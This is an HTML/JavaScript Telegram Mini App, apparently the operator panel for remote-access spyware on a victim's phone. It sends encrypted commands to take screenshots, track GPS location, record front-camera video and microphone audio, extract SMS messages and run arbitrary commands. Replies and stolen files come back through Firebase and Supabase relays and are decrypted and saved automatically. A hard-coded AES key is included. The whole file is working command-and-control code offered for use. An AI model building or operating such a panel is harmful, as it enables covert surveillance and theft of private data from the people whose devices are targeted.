<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sentinel Command Center</title>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Phosphor Icons for High-End UI -->
    <script src="https://unpkg.com/@phosphor-icons/web"></script>
    <!-- Crypto Libraries -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&family=JetBrains+Mono:wght@400;700&display=swap');

        :root {
            --bg-color: #050505;
            --glass-bg: rgba(20, 20, 25, 0.6);
            --glass-border: rgba(255, 255, 255, 0.08);
            --neon-cyan: #00f0ff;
            --neon-purple: #8a2be2;
        }

        body {
            background-color: var(--bg-color);
            background-image: 
                radial-gradient(circle at 15% 50%, rgba(0, 240, 255, 0.08), transparent 25%),
                radial-gradient(circle at 85% 30%, rgba(138, 43, 226, 0.08), transparent 25%);
            color: #e2e8f0;
            font-family: 'Inter', sans-serif;
            overflow: hidden;
        }

        .glass-panel {
            background: var(--glass-bg);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid var(--glass-border);
            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
        }

        .btn-action {
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            background: linear-gradient(145deg, rgba(30,30,35,0.8), rgba(15,15,20,0.8));
            border: 1px solid rgba(255,255,255,0.05);
        }

        .btn-action:hover {
            border-color: var(--neon-cyan);
            box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
            transform: translateY(-2px);
        }

        .btn-action:active {
            transform: scale(0.95);
        }

        .neon-text {
            text-shadow: 0 0 10px rgba(0, 240, 255, 0.5);
        }

        .terminal-font {
            font-family: 'JetBrains Mono', monospace;
        }

        /* Custom Scrollbar */
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: rgba(0, 240, 255, 0.3); border-radius: 10px; }
        ::-webkit-scrollbar-thumb:hover { background: var(--neon-cyan); }

        .nav-btn {
            transition: color 0.3s, text-shadow 0.3s;
        }
        .nav-btn.active {
            color: var(--neon-cyan);
            text-shadow: 0 0 12px rgba(0, 240, 255, 0.6);
        }

        /* Media Player Styling */
        video, audio {
            border-radius: 8px;
            outline: none;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        }
    </style>
</head>
<body class="h-screen flex flex-col p-4">

    <!-- Header -->
    <header class="w-full flex justify-between items-center mb-6 shrink-0 pt-2">
        <div class="flex items-center gap-3">
            <div class="w-10 h-10 rounded-full glass-panel flex items-center justify-center border-cyan-500/30 border">
                <i class="ph-fill ph-shield-check text-cyan-400 text-xl neon-text"></i>
            </div>
            <div>
                <h1 class="text-lg font-bold tracking-wider text-white">SENTINEL</h1>
                <p class="text-[10px] text-cyan-400 uppercase tracking-widest font-semibold flex items-center gap-1">
                    <span class="w-2 h-2 rounded-full bg-cyan-400 animate-pulse"></span> Core Active
                </p>
            </div>
        </div>
        <button onclick="openSettings()" class="w-10 h-10 rounded-full glass-panel flex items-center justify-center hover:text-cyan-400 transition-colors">
            <i class="ph ph-sliders text-xl"></i>
        </button>
    </header>

    <!-- Main Content Area -->
    <main class="flex-1 overflow-y-auto pb-24 relative hide-scrollbar">
        
        <!-- Dashboard (Controls) -->
        <section id="view-dashboard" class="block w-full h-full animate-fade-in">
            <h2 class="text-xs text-gray-500 uppercase tracking-widest mb-3">Tactical Commands</h2>
            <div class="grid grid-cols-2 gap-3 mb-4">
                <button onclick="sendCommand('/screen')" class="btn-action rounded-2xl p-4 flex flex-col items-center justify-center gap-2">
                    <i class="ph-fill ph-camera text-3xl text-gray-300"></i>
                    <span class="text-xs font-semibold text-gray-300">Screenshot</span>
                </button>
                <button onclick="sendCommand('/location')" class="btn-action rounded-2xl p-4 flex flex-col items-center justify-center gap-2">
                    <i class="ph-fill ph-crosshair text-3xl text-gray-300"></i>
                    <span class="text-xs font-semibold text-gray-300">GPS Locate</span>
                </button>
                <button onclick="sendCommand('/video front 10')" class="btn-action rounded-2xl p-4 flex flex-col items-center justify-center gap-2">
                    <i class="ph-fill ph-video-camera text-3xl text-gray-300"></i>
                    <span class="text-xs font-semibold text-gray-300">Front Video</span>
                </button>
                <button onclick="sendCommand('/audio 10')" class="btn-action rounded-2xl p-4 flex flex-col items-center justify-center gap-2">
                    <i class="ph-fill ph-microphone-stage text-3xl text-gray-300"></i>
                    <span class="text-xs font-semibold text-gray-300">Mic Intercept</span>
                </button>
                <button onclick="sendCommand('/sms')" class="btn-action rounded-2xl p-4 flex flex-col items-center justify-center gap-2">
                    <i class="ph-fill ph-chat-teardrop-text text-3xl text-gray-300"></i>
                    <span class="text-xs font-semibold text-gray-300">Extract SMS</span>
                </button>
                <button onclick="sendCommand('/getlogs')" class="btn-action rounded-2xl p-4 flex flex-col items-center justify-center gap-2">
                    <i class="ph-fill ph-terminal-window text-3xl text-gray-300"></i>
                    <span class="text-xs font-semibold text-gray-300">System Logs</span>
                </button>
            </div>

            <h2 class="text-xs text-gray-500 uppercase tracking-widest mb-3 mt-6">Custom Execution</h2>
            <div class="glass-panel rounded-2xl p-2 flex gap-2 items-center">
                <i class="ph ph-terminal text-cyan-400 ml-2 text-lg"></i>
                <input type="text" id="customCmd" placeholder="Enter command (e.g., /info)" class="flex-1 bg-transparent border-none px-2 py-2 text-white text-sm focus:outline-none placeholder-gray-600 terminal-font">
                <button onclick="sendCustomCommand()" class="bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white font-bold py-2 px-4 rounded-xl transition-all shadow-[0_0_10px_rgba(0,240,255,0.3)] text-sm">
                    EXECUTE
                </button>
            </div>
        </section>

        <!-- Terminal View -->
        <section id="view-terminal" class="hidden w-full h-full glass-panel rounded-2xl p-4 overflow-y-auto">
            <div class="flex items-center gap-2 mb-3 border-b border-gray-800 pb-2">
                <div class="flex gap-1.5">
                    <div class="w-3 h-3 rounded-full bg-red-500/80"></div>
                    <div class="w-3 h-3 rounded-full bg-yellow-500/80"></div>
                    <div class="w-3 h-3 rounded-full bg-green-500/80"></div>
                </div>
                <span class="text-xs text-gray-500 terminal-font ml-2">root@sentinel-core:~</span>
            </div>
            <div id="consoleOutput" class="terminal-font text-xs text-cyan-200 leading-relaxed break-words">
                <span class="text-gray-500">Initializing secure link...</span><br>
                <span class="text-green-400">Connection Established. Listening for responses...</span><br>
            </div>
        </section>

        <!-- Media Vault -->
        <section id="view-media" class="hidden w-full h-full glass-panel rounded-2xl p-4 overflow-y-auto">
            <div class="flex justify-between items-center mb-4 border-b border-gray-800 pb-2">
                <h2 class="text-sm text-gray-300 font-semibold uppercase tracking-wider">Decrypted Assets</h2>
                <i class="ph ph-hard-drives text-cyan-400 text-lg"></i>
            </div>
            <div id="mediaGallery" class="w-full flex flex-col gap-4">
                <div class="text-center text-gray-600 text-xs mt-10 italic">
                    Vault is currently empty.<br>Assets will appear here after decryption.
                </div>
            </div>
        </section>

    </main>

    <!-- Bottom Navigation (Floating) -->
    <nav class="fixed bottom-6 left-4 right-4 glass-panel rounded-2xl px-6 py-3 flex justify-between items-center shadow-2xl z-40 border border-white/10">
        <button id="nav-dashboard" onclick="switchTab('dashboard')" class="nav-btn active flex flex-col items-center gap-1 text-gray-400 w-16">
            <i class="ph-fill ph-squares-four text-2xl"></i>
            <span class="text-[9px] font-bold uppercase tracking-wider">Dash</span>
        </button>
        <button id="nav-terminal" onclick="switchTab('terminal')" class="nav-btn flex flex-col items-center gap-1 text-gray-400 w-16">
            <i class="ph-fill ph-code text-2xl"></i>
            <span class="text-[9px] font-bold uppercase tracking-wider">Term</span>
        </button>
        <button id="nav-media" onclick="switchTab('media')" class="nav-btn flex flex-col items-center gap-1 text-gray-400 w-16 relative">
            <i class="ph-fill ph-folder-lock text-2xl"></i>
            <span class="text-[9px] font-bold uppercase tracking-wider">Vault</span>
        </button>
    </nav>

    <!-- Settings Modal -->
    <div id="settingsModal" class="fixed inset-0 bg-black/80 backdrop-blur-sm flex justify-center items-center hidden z-50 p-4 opacity-0 transition-opacity duration-300">
        <div class="glass-panel w-full max-w-md rounded-2xl p-6 shadow-[0_0_40px_rgba(0,0,0,0.8)] border border-cyan-500/20 transform scale-95 transition-transform duration-300" id="settingsContent">
            
            <div class="flex justify-between items-center mb-6">
                <h2 class="text-lg font-bold text-white tracking-wider flex items-center gap-2">
                    <i class="ph-fill ph-cpu text-cyan-400"></i> Core Configuration
                </h2>
                <button onclick="closeSettings()" class="text-gray-400 hover:text-white"><i class="ph ph-x text-xl"></i></button>
            </div>

            <div class="space-y-4 max-h-[60vh] overflow-y-auto hide-scrollbar pr-2">
                <!-- AES Key -->
                <div>
                    <label class="block text-[10px] text-gray-400 uppercase tracking-widest mb-1">AES Master Key</label>
                    <div class="relative">
                        <i class="ph ph-key absolute left-3 top-1/2 -translate-y-1/2 text-gray-500"></i>
                        <input type="password" id="aesKey" class="w-full bg-black/50 border border-gray-700 rounded-xl pl-10 pr-3 py-2.5 text-white text-sm focus:border-cyan-400 focus:outline-none transition-colors" value="E&&2EPglZ4Ih43+g*nN4(l87+i7Y9sK&">
                    </div>
                </div>

                <!-- Connection Mode -->
                <div>
                    <label class="block text-[10px] text-gray-400 uppercase tracking-widest mb-1">Telemetry Route</label>
                    <div class="relative">
                        <i class="ph ph-broadcast absolute left-3 top-1/2 -translate-y-1/2 text-gray-500"></i>
                        <select id="connMode" class="w-full bg-black/50 border border-gray-700 rounded-xl pl-10 pr-3 py-2.5 text-white text-sm focus:border-cyan-400 focus:outline-none appearance-none">
                            <option value="telegram">Telegram Protocol (Default)</option>
                            <option value="firebase">Firebase Direct Tunnel</option>
                        </select>
                    </div>
                </div>

                <!-- Firebase Settings -->
                <div class="border-t border-gray-800 pt-4">
                    <label class="block text-[10px] text-orange-400 uppercase tracking-widest mb-2 font-bold"><i class="ph-fill ph-fire"></i> Firebase Relay</label>
                    <input type="text" id="fbUrl" class="w-full bg-black/50 border border-gray-700 rounded-xl px-3 py-2 text-white text-sm mb-2 focus:border-orange-400 focus:outline-none" placeholder="Firebase URL">
                    <input type="password" id="fbSecret" class="w-full bg-black/50 border border-gray-700 rounded-xl px-3 py-2 text-white text-sm focus:border-orange-400 focus:outline-none" placeholder="Database Secret">
                </div>

                <!-- Supabase Settings -->
                <div class="border-t border-gray-800 pt-4">
                    <label class="block text-[10px] text-emerald-400 uppercase tracking-widest mb-2 font-bold"><i class="ph-fill ph-cloud-arrow-down"></i> Supabase Vault</label>
                    <input type="text" id="sbUrl" class="w-full bg-black/50 border border-gray-700 rounded-xl px-3 py-2 text-white text-sm mb-2 focus:border-emerald-400 focus:outline-none" placeholder="Supabase URL">
                    <input type="password" id="sbKey" class="w-full bg-black/50 border border-gray-700 rounded-xl px-3 py-2 text-white text-sm mb-2 focus:border-emerald-400 focus:outline-none" placeholder="API Key">
                    <input type="text" id="sbBucket" class="w-full bg-black/50 border border-gray-700 rounded-xl px-3 py-2 text-white text-sm focus:border-emerald-400 focus:outline-none" placeholder="Bucket Name" value="pg-files">
                </div>
            </div>

            <button onclick="saveSettings()" class="w-full mt-6 bg-cyan-600 hover:bg-cyan-500 text-white font-bold py-3 rounded-xl transition-all shadow-[0_0_15px_rgba(0,240,255,0.4)] text-sm tracking-widest uppercase">
                Initialize System
            </button>
        </div>
    </div>

    <!-- Modern HUD Toast -->
    <div id="toast" class="fixed top-6 right-[-300px] glass-panel border-l-4 border-cyan-500 text-white px-4 py-3 rounded-r-xl shadow-[0_0_20px_rgba(0,0,0,0.5)] transition-all duration-300 z-50 text-xs font-semibold flex items-center gap-2">
        <i class="ph-fill ph-info text-cyan-400 text-lg" id="toast-icon"></i>
        <span id="toast-msg">Notification</span>
    </div>

    <script>
        // Telegram WebApp Init
        const tg = window.Telegram.WebApp;
        tg.expand();
        tg.setHeaderColor('#050505');

        let listenerInterval = null;
        let lastProcessedKey = null;

        // ================= UI & Animation Logic =================
        function switchTab(tab) {
            ['dashboard', 'terminal', 'media'].forEach(t => {
                document.getElementById(`view-${t}`).classList.add('hidden');
                document.getElementById(`nav-${t}`).classList.remove('active');
            });

            const view = document.getElementById(`view-${tab}`);
            view.classList.remove('hidden');
            view.classList.add('animate-fade-in');
            document.getElementById(`nav-${tab}`).classList.add('active');
        }

        function showToast(msg, type = 'info') {
            const toast = document.getElementById('toast');
            const toastMsg = document.getElementById('toast-msg');
            const toastIcon = document.getElementById('toast-icon');
            
            toastMsg.innerText = msg;
            
            if (type === 'error') {
                toast.classList.replace('border-cyan-500', 'border-red-500');
                toastIcon.className = "ph-fill ph-warning-circle text-red-400 text-lg";
            } else if (type === 'success') {
                toast.classList.replace('border-cyan-500', 'border-emerald-500');
                toastIcon.className = "ph-fill ph-check-circle text-emerald-400 text-lg";
            } else {
                toast.classList.replace('border-red-500', 'border-cyan-500');
                toast.classList.replace('border-emerald-500', 'border-cyan-500');
                toastIcon.className = "ph-fill ph-info text-cyan-400 text-lg";
            }

            toast.style.right = '16px';
            setTimeout(() => { toast.style.right = '-300px'; }, 3000);
        }

        function logToTerminal(text, type = 'normal') {
            const consoleOut = document.getElementById('consoleOutput');
            const time = new Date().toLocaleTimeString('en-US', { hour12: false });
            
            let colorClass = 'text-gray-300';
            if (type === 'sent') colorClass = 'text-purple-400';
            if (type === 'recv') colorClass = 'text-cyan-400';
            if (type === 'error') colorClass = 'text-red-400';
            if (type === 'success') colorClass = 'text-emerald-400';

            const formattedText = `<br><span class="text-gray-600">[${time}]</span> <span class="${colorClass}">${text}</span>`;
            consoleOut.innerHTML += formattedText;
            consoleOut.parentElement.scrollTop = consoleOut.parentElement.scrollHeight;
        }

        // ================= Cryptography (Web Crypto API) =================
        
        function encryptTextAES(plainText, secretKeyStr) {
            try {
                const key = CryptoJS.enc.Utf8.parse(secretKeyStr);
                const iv = CryptoJS.lib.WordArray.random(16);
                const encrypted = CryptoJS.AES.encrypt(plainText, key, {
                    iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7
                });
                const combined = iv.clone().concat(encrypted.ciphertext);
                return CryptoJS.enc.Base64.stringify(combined);
            } catch (error) {
                showToast("Encryption Failed", "error");
                return null;
            }
        }

        function decryptTextAES(encryptedBase64, secretKeyStr) {
            try {
                const key = CryptoJS.enc.Utf8.parse(secretKeyStr);
                const encryptedBytes = CryptoJS.enc.Base64.parse(encryptedBase64);
                const iv = CryptoJS.lib.WordArray.create(encryptedBytes.words.slice(0, 4));
                const ciphertext = CryptoJS.lib.WordArray.create(encryptedBytes.words.slice(4), encryptedBytes.sigBytes - 16);
                const decrypted = CryptoJS.AES.decrypt({ ciphertext: ciphertext }, key, {
                    iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7
                });
                return decrypted.toString(CryptoJS.enc.Utf8);
            } catch (error) { return "ERROR_DECRYPT"; }
        }

        async function decryptFileAES(encryptedArrayBuffer, secretKeyStr) {
            const enc = new TextEncoder();
            const keyMaterial = await window.crypto.subtle.importKey(
                "raw", enc.encode(secretKeyStr).slice(0, 32),
                { name: "AES-CBC" }, false, ["decrypt"]
            );
            const iv = encryptedArrayBuffer.slice(0, 16);
            const ciphertext = encryptedArrayBuffer.slice(16);
            return await window.crypto.subtle.decrypt({ name: "AES-CBC", iv: new Uint8Array(iv) }, keyMaterial, ciphertext);
        }

        // ================= Command Execution =================
        function sendCommand(cmd) {
            const aesKey = localStorage.getItem('aesKey');
            const mode = localStorage.getItem('connMode') || 'telegram';

            if (!aesKey) { openSettings(); return; }

            const encryptedData = encryptTextAES(cmd, aesKey);
            if (!encryptedData) return;

            logToTerminal(`TX > ${cmd}`, 'sent');

            if (mode === 'telegram') {
                tg.sendData(encryptedData);
                showToast("Command sent via Telegram Network", "success");
            } else {
                const fbUrl = localStorage.getItem('fbUrl');
                const fbSecret = localStorage.getItem('fbSecret');
                if (!fbUrl || !fbSecret) { showToast("Firebase config missing", "error"); return; }

                const payload = { cmd: encryptedData, status: "pending", reply_to: "PYTHON_FIREBASE" };
                fetch(`${fbUrl}/current_command.json?auth=${fbSecret}`, {
                    method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload)
                }).then(res => {
                    if(res.ok) showToast("Command sent via Firebase Tunnel", "success");
                    else showToast("Transmission Failed", "error");
                }).catch(err => showToast("Network Error", "error"));
            }
        }

        function sendCustomCommand() {
            const cmd = document.getElementById('customCmd').value;
            if(cmd.trim() !== '') {
                sendCommand(cmd);
                document.getElementById('customCmd').value = '';
            }
        }

        // ================= Firebase Listener =================
        function startListening() {
            const fbUrl = localStorage.getItem('fbUrl');
            const fbSecret = localStorage.getItem('fbSecret');
            const aesKey = localStorage.getItem('aesKey');

            if (!fbUrl || !fbSecret || !aesKey) return;
            if (listenerInterval) clearInterval(listenerInterval);

            logToTerminal("Listening for encrypted telemetry...", "normal");

            listenerInterval = setInterval(async () => {
                try {
                    const res = await fetch(`${fbUrl}/responses.json?auth=${fbSecret}&orderBy="$key"&limitToLast=1`);
                    const data = await res.json();
                    
                    if (data) {
                        const keys = Object.keys(data);
                        if (keys.length > 0) {
                            const latestKey = keys[0];
                            if (latestKey !== lastProcessedKey) {
                                lastProcessedKey = latestKey;
                                const encryptedPayload = data[latestKey].data;
                                const plainResponse = decryptTextAES(encryptedPayload, aesKey);
                                
                                if (plainResponse && plainResponse !== "ERROR_DECRYPT") {
                                    handleDecryptedResponse(plainResponse);
                                }
                            }
                        }
                    }
                } catch (e) { /* Silent fail for polling */ }
            }, 2000);
        }

        async function handleDecryptedResponse(text) {
            logToTerminal(`RX < \n${text}`, 'recv');
            showToast("New Data Received", "success");

            const match = text.match(/`([^`]+\.enc)`/);
            const isUploadSuccess = text.includes("SUPABASE UPLOAD SUCCESSFUL") || text.includes("تمت أرشفة الملف") || text.includes("موجود مسبقاً");

            if (match && match[1] && isUploadSuccess) {
                const fileName = match[1];
                logToTerminal(`Extracting encrypted asset from vault: ${fileName}`, "normal");
                await fetchAndProcessFile(fileName);
            }
        }

        // ================= Secure File Processing & Auto-Download =================
        async function fetchAndProcessFile(fileName) {
            const sbUrl = localStorage.getItem('sbUrl');
            const sbKey = localStorage.getItem('sbKey');
            const sbBucket = localStorage.getItem('sbBucket');
            const aesKey = localStorage.getItem('aesKey');

            if (!sbUrl || !sbKey || !sbBucket) {
                logToTerminal(`Supabase config missing. Cannot fetch asset.`, "error");
                return;
            }

            try {
                const fileUrl = `${sbUrl}/storage/v1/object/${sbBucket}/${fileName}`;
                const response = await fetch(fileUrl, {
                    headers: { 'apikey': sbKey, 'Authorization': `Bearer ${sbKey}` }
                });

                if (!response.ok) throw new Error("Cloud Fetch Failed");

                const encryptedBuffer = await response.arrayBuffer();
                const decryptedBuffer = await decryptFileAES(encryptedBuffer, aesKey);

                let mimeType = 'application/octet-stream';
                if (fileName.includes('.mp4')) mimeType = 'video/mp4';
                else if (fileName.includes('.jpg') || fileName.includes('.png')) mimeType = 'image/jpeg';
                else if (fileName.includes('.m4a') || fileName.includes('.mp3')) mimeType = 'audio/mp4';
                else if (fileName.includes('.txt')) mimeType = 'text/plain';

                const blob = new Blob([decryptedBuffer], { type: mimeType });
                const blobUrl = URL.createObjectURL(blob);
                const originalName = fileName.replace('.enc', '');

                logToTerminal(`Decryption successful. Asset loaded in RAM.`, "success");
                
                displayMedia(blobUrl, mimeType, originalName);
                autoDownloadBlob(blobUrl, originalName, mimeType);

            } catch (e) {
                logToTerminal(`Processing Error: ${e.message}`, "error");
            }
        }

        function displayMedia(blobUrl, mimeType, fileName) {
            const gallery = document.getElementById('mediaGallery');
            if (gallery.innerText.includes("empty")) gallery.innerHTML = '';

            const container = document.createElement('div');
            container.className = 'glass-panel p-3 rounded-xl flex flex-col gap-3 items-center border border-gray-800 relative overflow-hidden';
            
            // Cyberpunk accent line
            container.innerHTML += `<div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-cyan-500 to-purple-500"></div>`;

            const title = document.createElement('span');
            title.className = 'text-[11px] font-mono text-cyan-300 break-all w-full text-left mt-1';
            title.innerText = `>> ${fileName}`;
            container.appendChild(title);

            if (mimeType.startsWith('video/')) {
                container.innerHTML += `<video src="${blobUrl}" controls class="w-full bg-black rounded border border-gray-800" style="max-height: 250px;"></video>`;
            } else if (mimeType.startsWith('image/')) {
                container.innerHTML += `<img src="${blobUrl}" class="w-full bg-black rounded border border-gray-800" style="max-height: 250px; object-fit: contain;">`;
            } else if (mimeType.startsWith('audio/')) {
                container.innerHTML += `<audio src="${blobUrl}" controls class="w-full rounded mt-2 outline-none h-10"></audio>`;
            } else if (mimeType === 'text/plain') {
                fetch(blobUrl).then(r => r.text()).then(txt => {
                    const pre = document.createElement('pre');
                    pre.className = 'text-[10px] terminal-font text-left text-gray-300 w-full overflow-x-auto p-3 bg-[#0a0a0f] rounded border border-gray-800';
                    pre.style.maxHeight = '200px';
                    pre.innerText = txt;
                    container.appendChild(pre);
                });
            }

            const downloadBtn = document.createElement('a');
            downloadBtn.href = blobUrl;
            // Provide the structured path hint for the browser
            downloadBtn.download = getSuggestedPath(fileName, mimeType);
            downloadBtn.className = 'mt-2 w-full text-center bg-gray-800 hover:bg-gray-700 text-gray-300 text-[10px] uppercase tracking-widest py-2 rounded-lg transition-colors flex justify-center items-center gap-2';
            downloadBtn.innerHTML = `<i class="ph-bold ph-download-simple text-sm"></i> Manual Save`;
            container.appendChild(downloadBtn);

            gallery.prepend(container);
            switchTab('media');
        }

        // Generate Path based on MIME type
        function getSuggestedPath(fileName, mimeType) {
            let subFolder = "Documents";
            if (mimeType.startsWith('video/')) subFolder = "Videos";
            else if (mimeType.startsWith('image/')) subFolder = "Images";
            else if (mimeType.startsWith('audio/')) subFolder = "Audio";
            
            // The browser *might* strip the directory part, but we provide it anyway.
            return `MiniApp_Files/${subFolder}/${fileName}`;
        }

        function autoDownloadBlob(blobUrl, fileName, mimeType) {
            const suggestedPath = getSuggestedPath(fileName, mimeType);
            const a = document.createElement('a');
            a.style.display = 'none';
            a.href = blobUrl;
            a.download = suggestedPath;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            logToTerminal(`Auto-Save triggered for: ${suggestedPath}`, "normal");
        }

        // ================= Settings Management =================
        function openSettings() {
            const modal = document.getElementById('settingsModal');
            const content = document.getElementById('settingsContent');
            
            modal.classList.remove('hidden');
            // Trigger reflow for animation
            void modal.offsetWidth; 
            modal.classList.remove('opacity-0');
            modal.classList.add('opacity-100');
            content.classList.remove('scale-95');
            content.classList.add('scale-100');

            document.getElementById('aesKey').value = localStorage.getItem('aesKey') || 'E&&2EPglZ4Ih43+g*nN4(l87+i7Y9sK&';
            document.getElementById('connMode').value = localStorage.getItem('connMode') || 'telegram';
            document.getElementById('fbUrl').value = localStorage.getItem('fbUrl') || '';
            document.getElementById('fbSecret').value = localStorage.getItem('fbSecret') || '';
            document.getElementById('sbUrl').value = localStorage.getItem('sbUrl') || '';
            document.getElementById('sbKey').value = localStorage.getItem('sbKey') || '';
            document.getElementById('sbBucket').value = localStorage.getItem('sbBucket') || 'pg-files';
        }

        function closeSettings() {
            const modal = document.getElementById('settingsModal');
            const content = document.getElementById('settingsContent');
            
            modal.classList.remove('opacity-100');
            modal.classList.add('opacity-0');
            content.classList.remove('scale-100');
            content.classList.add('scale-95');

            setTimeout(() => { modal.classList.add('hidden'); }, 300);
        }

        function saveSettings() {
            localStorage.setItem('aesKey', document.getElementById('aesKey').value.trim());
            localStorage.setItem('connMode', document.getElementById('connMode').value);
            localStorage.setItem('fbUrl', document.getElementById('fbUrl').value.trim());
            localStorage.setItem('fbSecret', document.getElementById('fbSecret').value.trim());
            localStorage.setItem('sbUrl', document.getElementById('sbUrl').value.trim());
            localStorage.setItem('sbKey', document.getElementById('sbKey').value.trim());
            localStorage.setItem('sbBucket', document.getElementById('sbBucket').value.trim());

            closeSettings();
            showToast("Configuration Saved", "success");
            startListening();
        }

        // Init App
        window.onload = () => {
            if (!localStorage.getItem('aesKey') || !localStorage.getItem('fbSecret') || !localStorage.getItem('sbKey')) {
                setTimeout(openSettings, 500);
            } else {
                startListening();
            }
            
            // Add global CSS for simple animations
            const style = document.createElement('style');
            style.innerHTML = `
                @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
                .animate-fade-in { animation: fadeIn 0.4s ease-out forwards; }
                .hide-scrollbar::-webkit-scrollbar { display: none; }
                .hide-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
            `;
            document.head.appendChild(style);
        };
    </script>
</body>
</html>
